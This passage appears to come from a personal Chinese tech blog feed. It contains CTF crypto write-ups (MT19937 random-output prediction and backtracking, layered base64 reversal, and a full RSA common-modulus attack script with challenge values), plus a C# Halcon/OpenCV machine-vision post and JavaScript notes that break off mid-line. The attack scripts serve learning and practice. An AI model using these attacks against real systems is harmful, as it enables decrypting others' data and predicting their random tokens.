<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> extend_mt19937_predictor <span class="keyword">import</span> ExtendMT19937Predictor</span><br><span class="line"></span><br><span class="line">numbers = [random.getrandbits(<span class="number">64</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>)]</span><br><span class="line"></span><br><span class="line">predictor = ExtendMT19937Predictor()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">78</span>):</span><br><span class="line">    predictor.setrandbits(random.getrandbits(<span class="number">256</span>), <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">_ = [predictor.backtrack_getrandbits(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">78</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> numbers[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">assert</span> x == predictor.backtrack_getrandbits(<span class="number">64</span>)</span><br></pre></td></tr></table></figure>
<p>啊啊啊啊然后最窒息的地方来了，题目是一个Random类在初始化的时候生成一个id和code，总计生成了53个Random类，然后在回溯的时候填入已知数就得一个类一个类的丢回去，我直接把他分开来填入了，结果就是裂开….臭！</p>
<p>我的答案：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/09/c81a322b7b1f9f53.png" alt=""></p>
<p>正确答案：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/09/5b91a7a4d4c88ca9.png" alt=""></p>
<p><strong>总结：</strong> 这个问题就很明显是没有看清楚题目，这个库原理倒是好理解，就是在填入数字的时候，对题目理解不清楚了。嗯，再次总结：<strong>臭！</strong></p>
]]></content>
      <categories>
        <category>做题&amp;活动&amp;比赛の记录</category>
      </categories>
  </entry>
  <entry>
    <title>Crypto:来自摸鱼哥的浅学</title>
    <url>/2022/09/04/Crypto-%E6%9D%A5%E8%87%AA%E6%91%B8%E9%B1%BC%E5%93%A5%E7%9A%84%E6%B5%85%E5%AD%A6/</url>
    <content><![CDATA[<p> 来自一个学不明白堆的菜的研究：</p>
<span id="more"></span>
<h3 id="工具一把梭"><a href="#工具一把梭" class="headerlink" title="工具一把梭"></a>工具一把梭</h3><p>这里需要一个小工具，叫ciphey，命令行调用即可对密文进行解密，挺方便的。具体的安装方法csdn就有，有一些地方需要注意一下，但还是很快能安装完毕。安装完毕后使用命令行调用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ciphey -t &quot;需要解密的密文&quot;</span><br></pre></td></tr></table></figure>
<p>直接就返回明文以及具体的解答方式。</p>
<p>像这样：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/ebbb75e10c28e76d.png" alt=""></p>
<p>经典给出一堆乱码，像这种：</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/ea6c0712653d5fed.jpg" alt=""></p>
<h3 id="base64以及凯撒等简单密码"><a href="#base64以及凯撒等简单密码" class="headerlink" title="base64以及凯撒等简单密码"></a>base64以及凯撒等简单密码</h3><p>这里装好相应的库，对着密文一通decode就能（大概？解出最最简单的题目了</p>
<p>比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种就看着加密方式一步一步逆回去咯：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ans=<span class="string">&quot;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&quot;</span></span><br><span class="line"><span class="comment">#var=base64.decode(base64.b64decode(base64.b32decode(base64.b16decode(ans))),var)</span></span><br><span class="line">var2=base64.b64decode(base64.b32decode(base64.b16decode(ans)))</span><br><span class="line">var2=var2.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NSSCTF&#123;&quot;</span>+var2+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当然如果遇到纯粹的凯撒，那直接工具一把梭也是可以的</p>
<h3 id="RSA以及其共模攻击"><a href="#RSA以及其共模攻击" class="headerlink" title="RSA以及其共模攻击"></a>RSA以及其共模攻击</h3><p>这里就涉及一点数论知识了，还没有学习太深入，只能照葫芦画瓢抄一抄简单脚本：</p>
<p>这是题目附件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;***************&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e1= &#x27;</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e2= &#x27;</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解题脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#from xenny.ctf.crypto.modern.asymmetric.rsa import same_module</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag1=<span class="number">100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"></span><br><span class="line">flag2=<span class="number">86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"></span><br><span class="line">e1= <span class="number">3247473589</span></span><br><span class="line">e2= <span class="number">3698409173</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):  <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e1,e2:&quot;</span>,e1,e2)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mpz:&quot;</span>,s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def de(c, e, n): #因为此时的m不是真正的m，而是m^k，所以对m^k进行爆破</span></span><br><span class="line"><span class="comment">#     k = 0</span></span><br><span class="line"><span class="comment">#     while k&lt;1000: #指定k小于1000</span></span><br><span class="line"><span class="comment">#         mk = c + n*k</span></span><br><span class="line"><span class="comment">#         flag, true1 = gmpy2.iroot(mk, e)  #返回的第一个数值为开方数，第二个数值为布尔型，可整除为true，可自行测试</span></span><br><span class="line"><span class="comment">#         if True == true1:</span></span><br><span class="line"><span class="comment">#             # print(libnum.n2s(int(flag)))</span></span><br><span class="line"><span class="comment">#             return flag</span></span><br><span class="line"><span class="comment">#         k += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for e1 in range(2,e1e2):</span></span><br><span class="line"><span class="comment">#     if e1e2%e1==0:         #爆破可整除的e</span></span><br><span class="line"><span class="comment">#         e2=e1e2//e1</span></span><br><span class="line"><span class="comment">#         c=rsa_gong_N_def(e1, e2, c1, c2, n)</span></span><br><span class="line"><span class="comment">#         e=gmpy2.gcd(e1,e2)</span></span><br><span class="line"><span class="comment">#         m1=de(c, e, n)</span></span><br><span class="line"><span class="comment">#         if m1:  #指定输出m1</span></span><br><span class="line"><span class="comment">#             print(libnum.n2s(int(m1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#m = same_module.attack(n, e1, e2, flag1, flag2)</span></span><br><span class="line">m=rsa_gong_N_def(e1,e2,flag1,flag2,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure>
<p>中间被注释掉的部分是为了处理更难级别的题目，但在此题暂时还用不上。</p>
<p>暂时先到这里吧，RSA其中原理以及逆元还不是很清楚，摆烂（</p>
]]></content>
      <categories>
        <category>希踢爱抚!</category>
      </categories>
      <tags>
        <tag>密码</tag>
        <tag>基础</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>c#联合opencv&amp;Halcon编程探索</title>
    <url>/2024/07/23/c-%E8%81%94%E5%90%88opencv%E7%BC%96%E7%A8%8B%E6%8E%A2%E7%B4%A2/</url>
    <content><![CDATA[<p> N年没有写博客了2333，大三以后基本上都在开发一些项目，项目本身又不好写博客TT，所以好久好久没动过了，现在在做一个机器视觉方向的实习，刚好可以研究倒腾一下，然后给自己开个小坑，八月份看看能不能倒腾一下badusb。</p>
<h2 id="图片格式转换以及彩色转黑白模块"><a href="#图片格式转换以及彩色转黑白模块" class="headerlink" title="图片格式转换以及彩色转黑白模块"></a>图片格式转换以及彩色转黑白模块</h2><h3 id="Halcon开发"><a href="#Halcon开发" class="headerlink" title="Halcon开发"></a>Halcon开发</h3><p>首先我们要在halcon上把整个处理逻辑跑通，halcon是一个工业领域的机器视觉软件库，他提供很多有关图像处理的算子来帮助处理图像，算子就类似于封装好的函数，可以在编写程序的时候提高效率，要实现图片彩色转黑白，我们首先第一步是读入图片并且获得到一些基本信息，包括图片展示，宽高。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read_image (Image, &#x27;background/6355071687f84cfcb2cb002f9073f5a4.jpg&#x27;)</span><br><span class="line">get_image_size (Image, Width, Height)</span><br><span class="line">originalWidth:=Width</span><br><span class="line">originalHeight:=Height</span><br><span class="line">if(Width&gt;800 or Height&gt;800)  //预览图片时将图片等比缩小，避免图片太大占满窗口</span><br><span class="line">    Scale:=1.0</span><br><span class="line">    if(Width&gt;Height)</span><br><span class="line">        Scale:=800.0/Width</span><br><span class="line">    else</span><br><span class="line">        Scale:=800.0/Height</span><br><span class="line">    endif</span><br><span class="line">    Width:=Width*Scale</span><br><span class="line">    Height:=Height*Scale</span><br><span class="line">    </span><br><span class="line">endif</span><br><span class="line">dev_close_window ()</span><br><span class="line">dev_open_window (0, 0, Width, Height, &#x27;black&#x27;, WindowHandle)</span><br><span class="line">zoom_image_size(Image, ResizedImage, Width, Height, &#x27;constant&#x27;)     //ResizedImage就是重置大小后的图片</span><br><span class="line">dev_display (ResizedImage)</span><br><span class="line"></span><br><span class="line">stop ()</span><br></pre></td></tr></table></figure>
<p>halcon中可以使用函数stop()来打断点，方便调试，运行结果如下<br><img src="https://pic.imgdb.cn/item/668df3fed9c307b7e91d8e1d.png" alt=""></p>
<p>然后就是简单的调用转换模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rgb1_to_gray(Image,GrayImage)  //转换</span><br><span class="line">//预览</span><br><span class="line">dev_close_window ()</span><br><span class="line">dev_open_window (0, 0, Width, Height, &#x27;black&#x27;, WindowHandle)</span><br><span class="line">dev_display (GrayImage)</span><br><span class="line"></span><br><span class="line">stop()</span><br><span class="line">//写出图片，也就是修改格式</span><br><span class="line">write_image(GrayImage,&#x27;png&#x27;,0,&#x27;background/6355071687f84cfcb2cb002f9073f5a4(gray).png&#x27;)</span><br><span class="line">write_image(GrayImage,&#x27;jpg&#x27;,0,&#x27;background/6355071687f84cfcb2cb002f9073f5a4(gray).jpg&#x27;)</span><br></pre></td></tr></table></figure>
<p>最后一步就是导出为C#文件，依次点击文件———-&gt;导出<br><img src="https://pic.imgdb.cn/item/668e0696d9c307b7e9331f22.png" alt=""></p>
<p>至此halcon开发环节结束，我们得到了一个C#文件，接下来就是联合开发中的C#部分</p>
<h3 id="C-开发"><a href="#C-开发" class="headerlink" title="C#开发"></a>C#开发</h3><p>在导出C#文件之后，我们需要在visual studio里面新建工程，这里说个题外话，vscode我发现还是有不少坑，搞不定比如添加引用就很麻烦，因此选了visual studio。visual studio新建项目，选择Windows窗体应用就可以得到一个新的工程<br><img src="https://pic.imgdb.cn/item/668e287dd9c307b7e95cdeb4.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/668e287dd9c307b7e95cde91.png" alt=""></p>
<p>在新建完工程之后，需要引入halcon动态dll库，呃有点像java的导包，需要在解决方案资源管理器里右键引用<br><img src="https://pic.imgdb.cn/item/668e287dd9c307b7e95cde58.png" alt=""></p>
<p>使用预览找到halcondotnet.dll，这个文件没有以外的话应该是在你的halcon文件夹下的bin目录里，引入成功后就去工具箱右键选择项添加halcon对应的组件，引用的文件跟上面是一样的，也是halcondotnet.dll。引入的组件就是两个。</p>
<p><img src="https://pic.imgdb.cn/item/668e287dd9c307b7e95cde3f.png" alt=""></p>
<p>最后进行简单的拖拽把窗体布局放好，大概放个样子就行<br><img src="https://pic.imgdb.cn/item/668e287dd9c307b7e95cde16.png" alt=""></p>
<p>左边的黑窗可以像halcon一样展示图片，button按钮逻辑可以自行编写，比如点击按钮，图片转换开始。另外我们从halcon导出的代码比较长，我们只要找到action函数并将它复制到button按钮的逻辑里就行，当然不是说100%复制就行，还得阅读一下理解一下。</p>
<h3 id="C-完善"><a href="#C-完善" class="headerlink" title="C#完善"></a>C#完善</h3><p>在简单把导出的代码复制粘贴过来之后还需要写一些东西让他变得更“智能”，比如很多变量不能直接写死，在把主要功能粘贴成功后我们点运行就能得到一个窗口了:</p>
<p><img src="https://pic.imgdb.cn/item/668e2ea2d9c307b7e9650e6e.png" alt=""></p>
<p>接下来就是一些完善工作了，比如按钮的更人性化的操作等等</p>
<h2 id="Opencv的初步探索"><a href="#Opencv的初步探索" class="headerlink" title="Opencv的初步探索"></a>Opencv的初步探索</h2><p>因为halcon的库要钱（  ，所以如果要做一个工具箱，最好呢还是用免费的库，which is opencv 😋，这里我第一次使用opencv，所以还得从最开始的配置环境做起，我尝试了分别从两种项目引入opencv，一种是最普通原始的c++项目引入，另一种就是前面做的C#窗体项目中引入opencv</p>
<h3 id="原始C-引入"><a href="#原始C-引入" class="headerlink" title="原始C++引入"></a>原始C++引入</h3><p>看着<a href="https://blog.csdn.net/qq_34717531/article/details/135618145">傻瓜教程</a>一步一步配就好，注意你下载的opencv的版本和链接器里的版本保持一致就行，不然找不到<br><img src="https://pic.imgdb.cn/item/669778e9d9c307b7e9157f6a.png" alt=""></p>
<p>比如我这里是4.10.0版本就写opencv_world4100.lib。配置好之后跑一个小例子能跑通说明引入成功了。哦好像opencv需要添加一下环境变量，添加成功后应该是在终端输入“opencv_version”能看到版本号。到这就算是引入成功了，不过我也没打算在C++项目上用opencv，所以就点到为止了，重点在后面的C#窗体项目。</p>
<h3 id="C-窗体项目引入"><a href="#C-窗体项目引入" class="headerlink" title="C#窗体项目引入"></a>C#窗体项目引入</h3><p>C#窗体项目就有点抽象了，踩了一点坑。首先要找到nuget包管理器，在包管理器里面操作</p>
<p><img src="https://pic.imgdb.cn/item/66977ab3d9c307b7e91ab816.png" alt=""></p>
<p>找到opencv，勾上项目，安装</p>
<p><img src="https://pic.imgdb.cn/item/66977b41d9c307b7e91bef94.png" alt=""></p>
<p>当时这里就撞上了一个很逆天的坑，安装不了，每一次点安装，vs弹出来一个许可证书，点击接受之后，又弹回去了，压根安装不上，还没有报错信息，错误列表全空，根本不知道哪里有问题… 后来看错误列表旁边的输出，发现是.net框架版本不对，右键项目————-&gt;属性，修改框架版本</p>
<p><img src="https://pic.imgdb.cn/item/66977fdad9c307b7e9275a0f.png" alt=""></p>
<p>目标框架原本是用的4.5，安装不上，改成4.7，能安装了，这个坑搞得有点蛋疼，因为他没有报错信息，每次尝试安装就自动回滚，需要自己去找原因。至此C#窗体应用成功引入opencv，在对应的cs文件下使用命令 using OpenCvSharp 即可使用opencv。</p>
<h3 id="opencv库函数探索"><a href="#opencv库函数探索" class="headerlink" title="opencv库函数探索"></a>opencv库函数探索</h3><p>这里就是对opencv瞎玩儿，看看基本的功能，首先是读入展示图片，新建个Mat对象来保存图片，直接用ImShow函数展示图片</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Mat src = Cv2.ImRead(<span class="string">&quot;C:/testImg01.jpg&quot;</span>, ImreadModes.Color);</span><br><span class="line">Cv2.ImShow(<span class="string">&quot;dst&quot;</span>, src);</span><br></pre></td></tr></table></figure>
<h4 id="模板匹配"><a href="#模板匹配" class="headerlink" title="模板匹配"></a>模板匹配</h4><p>上传一个模板图片，一个目标图片，目标是找到图片中的模板，</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Cv2.MatchTemplate(target, template, result, TemplateMatchModes.CCoeffNormed);</span><br><span class="line"><span class="comment">// 找到最佳匹配位置</span></span><br><span class="line">Cv2.MinMaxLoc(result, <span class="keyword">out</span> <span class="built_in">double</span> minVal, <span class="keyword">out</span> <span class="built_in">double</span> maxVal, <span class="keyword">out</span> OpenCvSharp.Point minLoc, <span class="keyword">out</span> OpenCvSharp.Point maxLoc);</span><br><span class="line">OpenCvSharp.Point matchLoc = maxLoc;</span><br><span class="line"><span class="comment">// 在目标图像上用绿色矩形框标记匹配的位置</span></span><br><span class="line">Cv2.Rectangle(target, matchLoc, <span class="keyword">new</span> OpenCvSharp.Point(matchLoc.X + template.Cols, matchLoc.Y + template.Rows), Scalar.Blue, <span class="number">2</span>);</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>target是目标图片，template是模板图片，模板匹配得到的result是一个结果矩阵，我们要找到这个矩阵里的最大值，maxval就是最大值，maxloc就是这个矩阵的位置，根据位置可以得到matchloc，这是最佳匹配图像的左上角的点，因此就可以绘制出一个把模板框在里面的框框了。<br><img src="https://pic.imgdb.cn/item/669e2170d9c307b7e9c54adb.png" alt=""></p>
<p>这是一个理想的情况，找到符合条件的模板，然后就是翻车的情况</p>
<p><img src="https://pic.imgdb.cn/item/669f0563d9c307b7e979f7a5.png" alt=""></p>
<p>这个是匹配的时候多匹配了一个部分，但是这部分照理来说是要排除的，然后还有一种情况是分不清模板的，这个结果太抽象了，我也不知道应该怎么做233333</p>
<p><img src="https://pic.imgdb.cn/item/669f05dfd9c307b7e97a47c5.png" alt=""></p>
<p>-————————————————————————————————————————-(手动分割线)—————————————————————— </p>
<p>2333我又可以了笑死，把模板差值提高0.1，确定在0.6的时候他就能够分清不同模板了</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">double</span> threshold= <span class="number">0.6</span>;</span><br><span class="line"><span class="keyword">if</span> (maxVal &gt;= threshold)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 绘制矩形框标记出最佳匹配位置</span></span><br><span class="line">    OpenCvSharp.Point matchLoc = maxLoc;</span><br><span class="line">    Cv2.Rectangle(target, matchLoc, <span class="keyword">new</span> OpenCvSharp.Point(matchLoc.X + template.Cols, matchLoc.Y + template.Rows), Scalar.Green, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/669f07c4d9c307b7e97b7cc6.png" alt=""></p>
<p><img src="https://pic.imgdb.cn/item/669f088ed9c307b7e97c035d.png" alt=""></p>
<p>嘻嘻，这样就可以了，要注意的是如果模板本身是不对称的或者不规则的，需要不断旋转模板来跟图片比对，每旋转一次比对一次，还是有那么一点麻烦的。</p>
]]></content>
      <categories>
        <category>实习</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>C#</tag>
        <tag>图像处理</tag>
      </tags>
  </entry>
  <entry>
    <title>js学习一些总结</title>
    <url>/2023/08/11/js%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p> 这里记录一些在ubc暑期课程中学习js的一些难点，由于ubc讲课太快了，只能挑部分记录</p>
<h2 id="声明变量关键字"><a href="#声明变量关键字" class="headerlink" title="声明变量关键字"></a>声明变量关键字</h2><p>这是一个很折磨的地方，因为js中的声明变量可以像python一样不用定义类型，但是同时又可以使用var, let等关键字进行定义，所以需要区分清楚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">num=<span class="number">3</span> <span class="comment">//全局定义</span></span><br><span class="line"><span class="keyword">var</span> num=<span class="number">3</span> <span class="comment">//函数级定义</span></span><br><span class="line"><span class="keyword">let</span> num=<span class="number">3</span> <span class="comment">//块级定义</span></span><br><span class="line"><span class="keyword">const</span> num=<span class="number">3</span> <span class="comment">//块级常量定义</span></span><br></pre></td></tr></table></figure>
<p>如果什么都不加，那么就是全局定义，可以在全局环境中被访问，这种定义方式及其不推荐，因为很容易出现命名冲突，污染等问题。var关键字定义的变量在函数级作用域中生效，所以所有函数都能访问到这个变量，因此容易出现数据意外覆盖的问题，因此也不推荐使用，let和const生效的区域是块级域，这意味着较难出现数据污染的问题。</p>
<h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p>在js中，万物皆是对象，因此函数也是对象，它可以被当作参数放入另一个函数中，而在该函数执行完逻辑后调用这个传入函数的步骤，就是回调。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">randInt</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">whenBothFinish</span> (fn1, fn2, callback)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> fn1_done = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">var</span> fn2_done = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">checkFlagsAndCallback</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (fn1_done &amp;&amp; fn2_done) <span class="title function_">callback</span>();<span class="comment">//执行回调函数</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="title function_">fn1</span>();</span><br><span class="line">      fn1_done = <span class="literal">true</span>;</span><br><span class="line">      <span class="title function_">checkFlagsAndCallback</span>();</span><br><span class="line">   &#125;, <span class="title function_">randInt</span>());</span><br><span class="line"></span><br><span class="line">   <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="title function_">fn2</span>();</span><br><span class="line">      fn2_done = <span class="literal">true</span>;</span><br><span class="line">      <span class="title function_">checkFlagsAndCallback</span>();</span><br><span class="line">   &#125;, <span class="title function_">randInt</span>());</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">whenBothFinish</span>(</span><br><span class="line">   <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fn1 finished!&#x27;</span>); &#125;, <span class="comment">//fn1</span></span><br><span class="line">   <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fn2 finished!&#x27;</span>); &#125;, <span class="comment">//fn2</span></span><br><span class="line">   <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Both functions finished!&#x27;</span>); &#125;<span class="comment">//callback</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Called whenBothFinish&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>以上就是典型的回调例子，只有等到fn1和fn2都运行完毕后，才会执行callback的函数，这个方法也可以用在异步操作上。</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包这个概念之前确实不懂，目前根据我的理解，闭包的意思就是在函数嵌套函数的结构中，内部函数具有访问外部函数中变量的能力。也就是说，当内部函数调用参数的时候，优先在本函数作用域中寻找参数，如果没有，则会访问上一层函数去找这个参数。而当我们的外部函数返回的值是内部函数的时候，内部函数调用的外部参数值会保留，这点非常有用，这意味着外部函数的参数不会随着该函数返回而消失，而是会记录上一次的值，举个例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createCounter</span>(<span class="params">initialValue</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = initialValue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> increment;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counter1 = <span class="title function_">createCounter</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> counter2 = <span class="title function_">createCounter</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">counter1</span>(); <span class="comment">// 输出: 1</span></span><br><span class="line"><span class="title function_">counter1</span>(); <span class="comment">// 输出: 